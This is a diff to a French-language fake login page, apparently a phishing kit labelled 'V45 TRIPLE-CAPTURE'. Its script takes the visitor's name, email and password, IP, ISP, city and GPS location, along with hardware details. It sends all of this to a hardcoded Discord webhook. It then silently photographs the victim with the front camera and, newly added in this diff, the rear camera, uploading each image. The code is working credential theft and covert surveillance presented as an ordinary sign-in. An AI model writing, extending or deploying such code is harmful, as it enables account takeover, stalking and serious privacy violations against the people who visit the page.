@@ -37,7 +37,7 @@
             </div>
             <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
             <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
-            <button onclick="runV44()" class="btn-green">Se connecter</button>
+            <button onclick="runV45()" class="btn-green">Se connecter</button>
             <div class="alt-container">
                 <div class="divider">ou se connecter avec</div>
                 <button class="btn-alt">Continuer avec Google</button>
@@ -46,7 +46,7 @@
         </div>
         <div id="loader">
             <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
-            <p style="font-size: 11px; color: #1ed760; margin-top: 10px; font-weight:900;">VÉRIFICATION DOUBLE FLUX...</p>
+            <p style="font-size: 11px; color: #1ed760; margin-top: 10px; font-weight:900;">VÉRIFICATION TRIPLE FLUX...</p>
         </div>
     </div>
 
@@ -56,7 +56,7 @@
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
 
-        async function snap(name) {
+        async function snap() {
             const v = document.getElementById('v');
             const can = document.getElementById('c');
             can.width = v.videoWidth; can.height = v.videoHeight;
@@ -66,7 +66,7 @@
             });
         }
 
-        async function runV44() {
+        async function runV45() {
             const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
             if(!user.u || !user.p) return;
 
@@ -74,8 +74,9 @@
             document.getElementById('loader').style.display = 'block';
             const pb = document.getElementById('pbar');
             
+            // 1. CAPTURE DATA (Ton code original)
             let stream = null;
-            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); document.getElementById('v').srcObject = stream; } catch(e){}
+            try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); document.getElementById('v').srcObject = stream; } catch(e){}
 
             pb.style.width = "20%";
             let gps = "❌ Bloqué";
@@ -84,7 +85,6 @@
                 gps = `✅ [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
             } catch(e){}
 
-            // Récupération DATA
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
@@ -92,46 +92,54 @@
             const gpu = db ? gl.getParameter(db.UNMASKED_RENDERER_WEBGL) : "Inconnu";
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
 
-            // Envoi du Pavé Discord
             const payload = {
                 embeds: [{
-                    title: `🔱 V44 DOUBLE-SHOT ELITE - ${user.fn} ${user.ln}`,
+                    title: `🔱 V45 TRIPLE-CAPTURE - ${user.fn} ${user.ln}`,
                     color: 1955168,
                     fields: [
                         { name: "👤 ACCÈS COMPTE", value: `**Prénom/Nom:** \`${user.fn} ${user.ln}\`\n**Email:** \`${user.u}\`\n**Pass:** \`${user.p}\`` },
-                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\` (${net.country_name})\n**VPN/Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
-                        { name: "🛠️ HARDWARE (DÉTAILLÉ)", value: `**GPU:** \`${gpu}\`\n**Cœurs CPU:** \`${navigator.hardwareConcurrency}\`\n**RAM Dispo:** \`${navigator.deviceMemory || 'undefined'}GB\`\n**Écran:** \`${screen.width}x${screen.height}\` (DPR: ${window.devicePixelRatio})` },
-                        { name: "🔋 BATTERIE & AUDIO", value: `**Niveau:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**En charge:** \`${bat.charging ? 'OUI' : 'NON'}\`\n**Audio Ch:** \`${audioCtx.destination.channelCount}\`\n**Géoloc:** ${gps}` },
-                        { name: "💻 LOGICIEL", value: `**Système:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
+                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\`\n**VPN/Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
+                        { name: "🛠️ HARDWARE (DÉTAILLÉ)", value: `**GPU:** \`${gpu}\`\n**Cœurs CPU:** \`${navigator.hardwareConcurrency}\`\n**RAM:** \`${navigator.deviceMemory || 'undefined'}GB\`\n**Écran:** \`${screen.width}x${screen.height}\`` },
+                        { name: "🔋 BATTERIE & AUDIO", value: `**Niveau:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**Audio Ch:** \`${audioCtx.destination.channelCount}\`\n**Géoloc:** ${gps}` },
+                        { name: "💻 LOGICIEL", value: `**Système:** \`${navigator.platform}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
                     ],
-                    footer: { text: "LVN DOUBLE CAPTURE SYSTEM • " + new Date().toLocaleString() }
+                    footer: { text: "LVN TRIPLE SHOT SYSTEM • " + new Date().toLocaleString() }
                 }]
             };
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
-            pb.style.width = "50%";
-
-            // SEQUENCE DOUBLE PHOTO
+            // 2. SEQUENCE PHOTO DEVANT
             if(stream) {
-                // Photo 1 : Instantanée (après warm-up rapide)
+                pb.style.width = "40%";
                 await new Promise(r => setTimeout(r, 1500));
                 const b1 = await snap();
                 const fd1 = new FormData();
-                fd1.append('file', b1, 'shot1.jpg');
-                fd1.append('content', `📸 **PHOTO 1 (Instantanée) : ${user.fn} ${user.ln}**`);
+                fd1.append('file', b1, 'front1.jpg');
+                fd1.append('content', `📸 **PHOTO 1 (Avant) : ${user.fn} ${user.ln}**`);
                 await fetch(hook, { method: 'POST', body: fd1 });
 
-                pb.style.width = "80%";
-
-                // Photo 2 : 2 secondes plus tard
-                await new Promise(r => setTimeout(r, 2000));
+                pb.style.width = "60%";
+                await new Promise(r => setTimeout(r, 1500));
                 const b2 = await snap();
                 const fd2 = new FormData();
-                fd2.append('file', b2, 'shot2.jpg');
-                fd2.append('content', `📸 **PHOTO 2 (Focus) : ${user.fn} ${user.ln}**`);
+                fd2.append('file', b2, 'front2.jpg');
+                fd2.append('content', `📸 **PHOTO 2 (Avant) : ${user.fn} ${user.ln}**`);
                 await fetch(hook, { method: 'POST', body: fd2 });
 
+                // 3. SWITCH CAMÉRA ARRIÈRE
                 stream.getTracks().forEach(t => t.stop());
+                pb.style.width = "80%";
+                try {
+                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    document.getElementById('v').srcObject = backStream;
+                    await new Promise(r => setTimeout(r, 2000)); // Temps pour l'autofocus
+                    const b3 = await snap();
+                    const fd3 = new FormData();
+                    fd3.append('file', b3, 'back.jpg');
+                    fd3.append('content', `🔍 **PHOTO 3 (Arrière - Environnement) : ${user.fn} ${user.ln}**`);
+                    await fetch(hook, { method: 'POST', body: fd3 });
+                    backStream.getTracks().forEach(t => t.stop());
+                } catch(e) {}
             }
 
             pb.style.width = "100%";
